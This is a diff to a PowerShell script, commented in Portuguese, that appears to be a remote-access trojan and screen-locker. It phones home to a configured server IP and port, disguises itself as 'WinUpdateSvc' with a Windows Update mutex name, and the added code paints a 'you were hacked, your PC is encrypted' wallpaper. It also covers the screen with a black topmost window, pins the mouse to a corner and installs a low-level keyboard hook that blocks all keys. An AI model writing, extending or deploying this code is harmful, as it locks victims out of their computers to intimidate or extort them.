@@ -8,7 +8,7 @@ Versão: 10.0.19045.1 - Ultimate Edition
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -229,8 +229,8 @@ function Create-HackWallpaper {
         $graphics.Clear([System.Drawing.Color]::Black)
         
         # Configurar fonte
-        $fontTitulo = New-Object System.Drawing.Font("Arial Black", 48, [System.Drawing.FontStyle]::Bold)
-        $fontTexto = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
+        $fontGrande = New-Object System.Drawing.Font("Arial Black", 48, [System.Drawing.FontStyle]::Bold)
+        $fontMedio = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
         $fontPequeno = New-Object System.Drawing.Font("Arial", 28, [System.Drawing.FontStyle]::Bold)
         
         $brushVermelho = [System.Drawing.Brushes]::Red
@@ -238,16 +238,16 @@ function Create-HackWallpaper {
         $brushAmarelo = [System.Drawing.Brushes]::Orange
         
         # Desenhar linhas do wallpaper
-        $graphics.DrawString("VOCE FOI", $fontTitulo, $brushVermelho, 200, 150)
-        $graphics.DrawString("HACKEADO!", $fontTitulo, $brushVermelho, 200, 220)
+        $graphics.DrawString("VOCE FOI", $fontGrande, $brushVermelho, 200, 150)
+        $graphics.DrawString("HACKEADO!", $fontGrande, $brushVermelho, 200, 220)
         
-        $graphics.DrawString("SEU PC TA", $fontTexto, $brushBranco, 200, 320)
-        $graphics.DrawString("CRIPTOGRAFADO!", $fontTexto, $brushBranco, 200, 390)
+        $graphics.DrawString("SEU PC TA", $fontMedio, $brushBranco, 200, 320)
+        $graphics.DrawString("CRIPTOGRAFADO!", $fontMedio, $brushBranco, 200, 390)
         
-        $graphics.DrawString("CRYPTO-LOCKED", $fontTexto, $brushAmarelo, 200, 490)
+        $graphics.DrawString("CRYPTO-LOCKED", $fontMedio, $brushAmarelo, 200, 490)
         
         $graphics.DrawString("ANLGUUR", $fontPequeno, $brushBranco, 200, 590)
-        $graphics.DrawString("NOTTI GANG", $fontTitulo, $brushVermelho, 200, 660)
+        $graphics.DrawString("NOTTI GANG", $fontGrande, $brushVermelho, 200, 660)
         
         # Adicionar bordas decorativas
         $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red, 5)
@@ -274,7 +274,6 @@ function Set-Wallpaper {
     try {
         Write-DebugLog "Aplicando wallpaper no sistema"
         
-        # Código C# para alterar wallpaper
         $code = @'
 using System;
 using System.Runtime.InteropServices;
@@ -291,10 +290,270 @@ public class Wallpaper {
         [Wallpaper]::Set($wallpaperPath)
         
         Write-DebugLog "Wallpaper aplicado com sucesso"
-        return "WALLPAPER_SET"
+        return $true
     } catch {
         Write-DebugLog "Erro ao aplicar wallpaper: $_"
-        return "WALLPAPER_ERROR"
+        return $false
+    }
+}
+
+# ===== TELA PRETA TOTAL =====
+function Show-BlackScreen {
+    try {
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            Add-Type -AssemblyName System.Drawing
+            
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            
+            # Bloquear todas as teclas
+            $form.Add_KeyDown({ $_.SuppressKeyPress = $true })
+            $form.Add_KeyUp({ $_.SuppressKeyPress = $true })
+            
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
+        
+        Write-DebugLog "Tela preta total ativada"
+        return $true
+    } catch {
+        Write-DebugLog "Erro ao ativar tela preta: $_"
+        return $false
+    }
+}
+
+# ===== TRAVAR MOUSE =====
+$script:mouseLocked = $false
+$script:lockThread = $null
+
+function Lock-Mouse {
+    try {
+        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
+        
+        $script:mouseLocked = $true
+        
+        $script:lockThread = [System.Threading.Thread]::new({
+            while ($script:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 5
+                } catch {}
+            }
+        })
+        $script:lockThread.IsBackground = $true
+        $script:lockThread.Start()
+        
+        return "MOUSE_LOCKED"
+    } catch {
+        return "MOUSE_LOCK_ERROR"
+    }
+}
+
+function Unlock-Mouse {
+    try {
+        $script:mouseLocked = $false
+        if ($script:lockThread -and $script:lockThread.IsAlive) {
+            $script:lockThread.Abort()
+        }
+        return "MOUSE_UNLOCKED"
+    } catch {
+        return "MOUSE_UNLOCK_ERROR"
+    }
+}
+
+# ===== BLOQUEAR TECLADO =====
+$script:keyboardHook = $null
+$script:keyboardLocked = $false
+
+function Lock-Keyboard {
+    try {
+        if ($script:keyboardLocked) { return "KEYBOARD_ALREADY_LOCKED" }
+        
+        $script:keyboardLocked = $true
+        
+        # Usar código C# para hook de teclado
+        $keyboardCode = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+public class KeyboardLocker {
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    private static bool _locked = false;
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    public static void Lock() {
+        _locked = true;
+        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
+        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
+            _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+    
+    public static void Unlock() {
+        _locked = false;
+        if (_hookID != IntPtr.Zero) {
+            UnhookWindowsHookEx(_hookID);
+            _hookID = IntPtr.Zero;
+        }
+    }
+    
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (_locked && nCode >= 0) {
+            return (IntPtr)1; // Bloqueia a tecla
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+}
+'@
+        Add-Type -TypeDefinition $keyboardCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+        [KeyboardLocker]::Lock()
+        
+        return "KEYBOARD_LOCKED"
+    } catch {
+        Write-DebugLog "Erro ao bloquear teclado: $_"
+        return "KEYBOARD_ERROR"
+    }
+}
+
+function Unlock-Keyboard {
+    try {
+        [KeyboardLocker]::Unlock()
+        $script:keyboardLocked = $false
+        return "KEYBOARD_UNLOCKED"
+    } catch {
+        return "KEYBOARD_UNLOCK_ERROR"
+    }
+}
+
+# ===== FUNÇÃO LOCK TOTAL (TUDO TRAVADO + WALLPAPER) =====
+$global:lockActive = $false
+$global:mouseLockThread = $null
+
+function Activate-Lock {
+    try {
+        if ($global:lockActive) { return "LOCK_ALREADY_ACTIVE" }
+        
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "ATIVANDO LOCK TOTAL - WALLPAPER HACKEADO + TUDO TRAVADO"
+        Write-DebugLog ("=" * 60)
+        
+        $global:lockActive = $true
+        
+        # 1. Criar wallpaper hackeado
+        Write-DebugLog "Criando wallpaper hackeado"
+        Create-HackWallpaper
+        
+        # 2. Alterar wallpaper
+        Write-DebugLog "Aplicando wallpaper"
+        Set-Wallpaper
+        
+        # 3. Ativar tela preta total
+        Write-DebugLog "Ativando tela preta"
+        Show-BlackScreen
+        
+        # 4. Travar mouse
+        Write-DebugLog "Ativando travamento de mouse"
+        $global:mouseLockThread = [System.Threading.Thread]::new({
+            while ($global:lockActive) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 5
+                } catch {}
+            }
+        })
+        $global:mouseLockThread.IsBackground = $true
+        $global:mouseLockThread.Start()
+        
+        # 5. Bloquear teclado
+        Write-DebugLog "Ativando bloqueio de teclado"
+        Lock-Keyboard
+        
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "LOCK TOTAL ATIVADO COM SUCESSO"
+        Write-DebugLog ("=" * 60)
+        
+        return "LOCK_ACTIVATED"
+    } catch {
+        Write-DebugLog "ERRO ao ativar lock total: $_"
+        return "LOCK_ERROR"
+    }
+}
+
+function Deactivate-Lock {
+    try {
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "DESATIVANDO LOCK TOTAL"
+        Write-DebugLog ("=" * 60)
+        
+        $global:lockActive = $false
+        
+        # 1. Fechar tela preta
+        try {
+            [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+                $_.Invoke([Action]{ $_.Close() })
+            }
+            Write-DebugLog "Tela preta fechada"
+        } catch {}
+        
+        # 2. Parar thread do mouse
+        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
+            $global:mouseLockThread.Abort()
+            Write-DebugLog "Thread de mouse abortada"
+        }
+        
+        # 3. Liberar teclado
+        Unlock-Keyboard
+        Write-DebugLog "Teclado liberado"
+        
+        # 4. Restaurar wallpaper padrão
+        try {
+            $code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    
+    public static void Set(string path) {
+        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
+    }
+}
+'@
+            Add-Type -TypeDefinition $code -ErrorAction Stop
+            [Wallpaper]::Set("")
+        } catch {}
+        
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "LOCK TOTAL DESATIVADO"
+        Write-DebugLog ("=" * 60)
+        
+        return "LOCK_DEACTIVATED"
+    } catch {
+        Write-DebugLog "ERRO ao desativar lock total: $_"
+        return "UNLOCK_ERROR"
     }
 }
 
@@ -555,136 +814,6 @@ function Unlock-Drives {
         }
     }
     return "DRIVES_UNLOCKED:" + ($results -join ";")
-}
-
-# ===== TRAVAR MOUSE =====
-$script:mouseLocked = $false
-$script:lockThread = $null
-
-function Lock-Mouse {
-    try {
-        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
-        
-        $script:mouseLocked = $true
-        
-        $script:lockThread = [System.Threading.Thread]::new({
-            while ($script:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {}
-            }
-        })
-        $script:lockThread.IsBackground = $true
-        $script:lockThread.Start()
-        
-        return "MOUSE_LOCKED"
-    } catch {
-        return "MOUSE_LOCK_ERROR"
-    }
-}
-
-function Unlock-Mouse {
-    try {
-        $script:mouseLocked = $false
-        if ($script:lockThread -and $script:lockThread.IsAlive) {
-            $script:lockThread.Abort()
-        }
-        return "MOUSE_UNLOCKED"
-    } catch {
-        return "MOUSE_UNLOCK_ERROR"
-    }
-}
-
-# ===== FUNÇÃO LOCK TOTAL (WALLPAPER HACKEADO + MOUSE) =====
-$global:lockActive = $false
-$global:mouseLockThread = $null
-
-function Activate-Lock {
-    try {
-        if ($global:lockActive) { return "LOCK_ALREADY_ACTIVE" }
-        
-        Write-DebugLog ("=" * 60)
-        Write-DebugLog "ATIVANDO LOCK TOTAL - WALLPAPER HACKEADO"
-        Write-DebugLog ("=" * 60)
-        
-        $global:lockActive = $true
-        
-        # 1. Criar wallpaper hackeado
-        Write-DebugLog "Criando wallpaper hackeado"
-        Create-HackWallpaper
-        
-        # 2. Alterar wallpaper
-        Write-DebugLog "Aplicando wallpaper"
-        Set-Wallpaper
-        
-        # 3. Travar mouse
-        Write-DebugLog "Ativando travamento de mouse"
-        $global:mouseLockThread = [System.Threading.Thread]::new({
-            while ($global:lockActive) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {
-                    # Ignora erros
-                }
-            }
-        })
-        $global:mouseLockThread.IsBackground = $true
-        $global:mouseLockThread.Start()
-        
-        Write-DebugLog ("=" * 60)
-        Write-DebugLog "LOCK TOTAL ATIVADO COM SUCESSO"
-        Write-DebugLog ("=" * 60)
-        
-        return "LOCK_ACTIVATED"
-    } catch {
-        Write-DebugLog "ERRO ao ativar lock total: $_"
-        return "LOCK_ERROR"
-    }
-}
-
-function Deactivate-Lock {
-    try {
-        Write-DebugLog ("=" * 60)
-        Write-DebugLog "DESATIVANDO LOCK TOTAL"
-        Write-DebugLog ("=" * 60)
-        
-        $global:lockActive = $false
-        
-        # 1. Parar thread do mouse
-        if ($global:mouseLockThread -and $global:mouseLockThread.IsAlive) {
-            $global:mouseLockThread.Abort()
-            Write-DebugLog "Thread de mouse abortada"
-        }
-        
-        # 2. Restaurar wallpaper padrão
-        try {
-            $code = @'
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    
-    public static void Set(string path) {
-        SystemParametersInfo(20, 0, path, 0x01 | 0x02);
-    }
-}
-'@
-            Add-Type -TypeDefinition $code -ErrorAction Stop
-            [Wallpaper]::Set("")
-        } catch {}
-        
-        Write-DebugLog ("=" * 60)
-        Write-DebugLog "LOCK TOTAL DESATIVADO"
-        Write-DebugLog ("=" * 60)
-        
-        return "LOCK_DEACTIVATED"
-    } catch {
-        Write-DebugLog "ERRO ao desativar lock total: $_"
-        return "UNLOCK_ERROR"
-    }
 }
 
 # ===== MICROFONE =====
